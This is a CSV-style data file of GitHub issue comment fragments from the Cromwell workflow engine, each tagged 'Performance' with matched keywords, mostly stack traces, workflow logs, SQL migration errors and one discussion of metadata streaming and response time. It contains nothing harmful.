Performance,actor.default-dispatcher-16 ERROR - CallActor [UUID(129f0510):CollectQualityYieldMetrics:2]: Failing call: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589855:java.lang.Throwable: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589856- at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$handleFailure(JesBackend.scala:774) ~[cromwell.jar:0.19]; 3589857- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:685) ~[cromwell.jar:0.19]; 3589858- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:659) ~[cromwell.jar:0.19]; 3589859- at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; 3589860- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; 3589861- at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; 3589862- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 3589863- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 3589864- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 3589865- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 3589866- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) ~[cromwell.jar:0.19]; 3589867- at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; 3589868- at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.s,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:3150,concurren,concurrent,3150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['concurren'],['concurrent']
Performance,actory.java:88); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:423); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:399); 	at cromwell.backend.google.pipelines.v1alpha2.GenomicsFactory$$anon$1.runRequest(GenomicsFactory.scala:85); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline(PipelinesApiRunCreationClient.scala:53); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline$(PipelinesApiRunCreationClient.scala:48); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.runPipeline(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$createNewJob$19(PipelinesApiAsyncBackendJobExecutionActor.scala:572); 	at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinP,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629:1985,concurren,concurrent,1985,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629,1,['concurren'],['concurrent']
Performance,adService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:22); 	at software.amazon.awssdk.core.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:7263,load,loadService,7263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['load'],['loadService']
Performance,"ala:21); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:19); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JES error code 10. Message: 15: Gsutil failed: failed to upload logs for ""gs:/; /broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19; ec38f93/call-M2/shard-108/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full; _dl_o",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:1460,concurren,concurrent,1460,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,1,['concurren'],['concurrent']
Performance,"aller:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1] Status change from - to Initializing; [2016-10-28 14:38:43,07] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.PlotACNVResults:3:1] Status change from - to Initializing; [2016-10-28 14:38:43,07] [warn] 1 failures fetching JES statuses: {""domain"":""global"",""message"":""Deadline expired before operation could complete."",""reason"":""backendError""}; [2016-10-28 14:38:43,07] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:4:1]: Caught exception, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:15070,concurren,concurrent,15070,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,4,['concurren'],['concurrent']
Performance,"allows the stream to be stopped at any point in time (say if we ran over the endpoint timeout).; Note that even without streaming data from the database, we can still build the json from the strict set of events using an fs2 stream and stop that if/when needed. Another graph where Cromwell was asked to build several large metadata jsons:. ![screen shot 2018-10-19 at 1 17 28 pm](https://user-images.githubusercontent.com/2978948/47926437-ee57eb00-de96-11e8-89b4-a7df8db9e164.png); Red is non streaming, blue is streaming. ---; The main takeaway is that when **under memory pressure** (i.e when available memory is insufficient to build the requested metadata), streaming makes a significant difference on relieving the heap usage for medium to large (> 100K) metadata. ### The less good. - Response time is not as good. The use cases above were specifically targeted towards trying to build large to very large metadata.; However when used in a more realistic scenario with lots of small sized metadata and few large ones, the overall response time is increasing significantly.; If Cromwell has sufficient memory to sustain the load then streaming does not give any real improvement.; The graph below shows memory usage with (v1s) and without streaming (v1) when Cromwell has enough memory to build all requests (in MB).; ![memory-v1-v1s](https://user-images.githubusercontent.com/2978948/48013920-818d5c80-e0f3-11e8-9f71-d4dedcbb2ba1.png). The graph below shows the average response time of the metadata endpoint with and without streaming (in ms).; ![metadata-200-v1-v1s](https://user-images.githubusercontent.com/2978948/48013852-53a81800-e0f3-11e8-9152-6c844e896b09.png). A plausible explanation of the response time increase is that the connection to the DB needs to remain open (and can't be re-used) for as long as the stream is not closed. This includes time spent pulling data out of the database AND building the JSON.; Whereas in the non streaming version, the connection can be re-used f",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:2541,response time,response time,2541,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,1,['response time'],['response time']
Performance,"anagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x000000015b76b538> (a java.lang.ref.ReferenceQueue$Lock); at co",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:5157,concurren,concurrent,5157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,ap$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(Fo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:5124,concurren,concurrent,5124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,"as tweaked since the last release in a change from @cjllanwarne (https://github.com/broadinstitute/cromwell/commit/33c58ef22b6a8edc4c1912c1416225c79d298f76#diff-39fe7186c2383fc1135f29a9c05e4e57) but I don't; grasp the scope of the change enough to know if this triggers it. In our CWL run, the jobs get submitted to the cluster and run okay based on the; work directories in `cromwell-execution` but the polling dies with:; ```; [2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1387,concurren,concurrent,1387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['concurren'],['concurrent']
Performance,"ase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.java:309); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:55); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:113); 	at liquibase.database.AbstractJdbcDatabase.execute(AbstractJdbcDatabase.java:1277); 	at liquibase.database.AbstractJdbcDatabase.executeStatements(AbstractJdbcDatabase.java:1259); 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:582); 	... 16 common frames omitted; Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column '%failures%causedBy:%' in",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809:2495,concurren,concurrent,2495,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809,1,['concurren'],['concurrent']
Performance,"ase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.java:309); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:55); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:113); 	at liquibase.database.AbstractJdbcDatabase.execute(AbstractJdbcDatabase.java:1277); 	at liquibase.database.AbstractJdbcDatabase.executeStatements(AbstractJdbcDatabase.java:1259); 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:582); 	... 16 common frames omitted; Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column '%failures",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103:2571,concurren,concurrent,2571,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103,1,['concurren'],['concurrent']
Performance,"ase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column ':causedBy[]' in 'field list' [Failed SQL: INSERT INTO METADATA_ENTRY (WORKFLOW_EXECUTION_UUID, METADATA_KEY, CALL_FQN, JOB_SCATTER_INDEX, JOB_RETRY_ATTEMPT, METADATA_TIMESTAMP); SELECT t1.WORKFLOW_EXECUTION_UUID, CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[]""), t1.CALL_FQN, t1.JOB_SCATTER_INDEX, t1.JOB_RETRY_ATTEMPT, t1.METADATA_TIMESTAMP; FROM METADATA_ENTRY AS t1; WHERE METADATA_KEY LIKE '%failures[%]%:message'; AND NOT EXISTS (SELECT *; 	FROM METADATA_ENTRY AS t2; 	WHERE t2.WORKFLOW_EXECUTION_UUID = t1.WORKFLOW_EXECUTION_UUID; 	 AND (t2.CALL_FQN = t1.CALL_FQN OR (t2.CALL_FQN IS NULL AND t1.CALL_FQN IS NULL)); 	 AND (t2.JOB_SCATTER_INDEX = t1.JOB_SCATTER_INDEX OR (t2.JOB_SCATTER_INDEX IS NULL AND t1.JOB_SCATTER_INDEX IS NULL)); 	 AND (t2.JOB_RETRY_ATTEMPT = t1.JOB_RETRY_ATTEMPT OR (t2.JOB_RE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701:4218,concurren,concurrent,4218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701,1,['concurren'],['concurrent']
Performance,ashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at 